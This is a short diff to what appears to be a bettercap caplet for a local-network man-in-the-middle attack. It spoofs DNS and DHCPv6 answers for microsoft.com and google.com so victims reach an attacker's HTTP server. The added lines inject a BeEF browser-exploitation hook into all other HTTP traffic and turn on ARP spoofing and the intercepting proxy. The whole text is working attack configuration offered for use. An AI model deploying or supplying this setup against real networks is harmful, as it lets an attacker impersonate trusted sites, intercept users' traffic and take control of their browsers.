@@ -1,6 +1,8 @@
 # let's spoof Microsoft and Google ^_^
 set dns.spoof.domains microsoft.com, google.com
 set dhcp6.spoof.domains microsoft.com, google.com
+# and let's inject a beef hook into everything else ^_^
+set http.proxy.script caplets/beef-inject.js
 
 # every request http request to the spoofed hosts will come to us
 # let's give em some contents
@@ -14,6 +16,10 @@ http.server on
 dhcp6.spoof on
 # send spoofed DNS replies ^_^
 dns.spoof on
+# just in case U.U'
+arp.spoof on
+# enable proxy
+http.proxy on
 
 # set a custom prompt for ipv6
 set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
